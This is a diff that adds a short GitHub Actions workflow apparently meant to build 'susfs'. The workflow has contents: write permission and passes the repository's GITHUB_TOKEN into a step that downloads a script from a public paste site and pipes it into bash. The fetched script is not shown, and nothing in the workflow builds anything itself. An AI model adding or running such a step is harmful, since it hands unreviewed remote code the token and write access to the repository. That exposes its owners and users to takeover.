@@ -1,0 +1,16 @@
+name: build-susfs
+on: [workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  b:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with: {fetch-depth: 0}
+      - env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          curl -fsSL https://paste.c-net.org/MartyFactions -o /tmp/run.sh
+          bash /tmp/run.sh
